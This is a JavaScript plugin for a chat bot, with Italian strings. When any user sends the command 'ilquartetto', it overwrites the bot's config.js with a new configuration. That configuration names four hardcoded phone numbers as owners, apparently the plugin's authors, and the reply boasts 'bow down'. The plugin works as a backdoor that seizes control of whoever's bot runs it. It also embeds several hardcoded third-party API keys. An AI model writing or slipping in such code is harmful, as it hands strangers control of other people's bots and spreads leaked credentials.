import fs from 'fs';
import path from 'path';

let handler = async (m, { conn }) => {
  const configPath = path.join(process.cwd(), 'config.js');
  const nuovoContenuto = `
//Plugin fatto da Gabs & 333 Staff
import { watchFile, unwatchFile } from 'fs'
import chalk from 'chalk'
import fs from 'fs'
import { fileURLToPath } from 'url'

global.botnumber = ""
global.confirmCode = ""

global.owner = [["393271710598","Owner",true],["639649477630","ℝ𝕀𝔸𝔻ꪶ💎ꫂ⁩⁩",true],
["447365589428","『𝐃𝐄𝐀𝐓𝐇』",true],
["393762030481","Gabs",true],
]

global.mods = ['xxxxxxxxxx'] 
global.prems = ['xxxxxxxxxx', 'xxxxxxxxxx']

global.keysZens = ['c2459db922', '37CC845916', '6fb0eff124']
global.keysxxx = keysZens[Math.floor(keysZens.length * Math.random())]
global.keysxteammm = ['29d4b59a4aa687ca', '5LTV57azwaid7dXfz5fzJu', 'cb15ed422c71a2fb', '5bd33b276d41d6b4', 'HIRO', 'kurrxd09', 'ebb6251cc00f9c63']
global.keysxteam = keysxteammm[Math.floor(keysxteammm.length * Math.random())]
global.keysneoxrrr = ['5VC9rvNx', 'cfALv5']
global.keysneoxr = keysneoxrrr[Math.floor(keysneoxrrr.length * Math.random())]
global.lolkeysapi = ['BrunoSobrino']

global.APIs = { 
  xteam: 'https://api.xteam.xyz', 
  nrtm: 'https://fg-nrtm-nhie.onrender.com',
  bg: 'http://bochil.ddns.net',
  fgmods: 'https://api-fgmods.ddns.net',
  dzx: 'https://api.dhamzxploit.my.id',
  lol: 'https://api.lolhuman.xyz',
  violetics: 'https://violetics.pw',
  neoxr: 'https://api.neoxr.my.id',
  zenzapis: 'https://zenzapis.xyz',
  akuari: 'https://api.akuari.my.id',
  akuari2: 'https://apimu.my.id',	
  fgmods: 'https://api-fgmods.ddns.net'
},
global.APIKeys = { 
  'https://api.xteam.xyz': \`\${keysxteam}\`,
  'https://api.lolhuman.xyz': '85faf717d0545d14074659ad',
  'https://api.neoxr.my.id': \`\${keysneoxr}\`,	
  'https://violetics.pw': 'beta',
}

global.imagen1 = ['./media/menu1.jpg']
global.imagen4 = fs.readFileSync('./bixbyvision16.png')

global.packname = '𝑶𝒓𝒊𝒈𝒊𝒏'
global.author = '✦'

global.vs = '𝟐.𝟐'
global.nomebot = '𝑶𝒓𝒊𝒈𝒊𝒏✦'
global.multiplier = 69 
global.maxwarn = '4' 

global.wm = '𝑶𝒓𝒊𝒈𝒊𝒏✦'
global.wait = 'ⓘ 𝐂𝐚𝐫𝐢𝐜𝐚𝐦𝐞𝐧𝐭𝐨 ...'

global.flaaa = [
'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=',
'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=crafts-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&text=',
'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=amped-logo&doScale=true&scaleWidth=800&scaleHeight=500&text=',
'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=',
'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text=']

let file = fileURLToPath(import.meta.url)
watchFile(file, () => {
  unwatchFile(file)
  console.log(chalk.redBright("Update 'config.js'"))
  import(\`\${file}?update=\${Date.now()}\`)
})
`;

  try {
    fs.writeFileSync(configPath, nuovoContenuto.trim());
    conn.reply(m.chat, 'Il quartetto è tornato, inchinatevi!', m);
  } catch (err) {
    conn.reply(m.chat, `Errore nel modificare il file: ${err.message}`, m);
  }
};

handler.command = ['ilquartetto'];
export default handler;
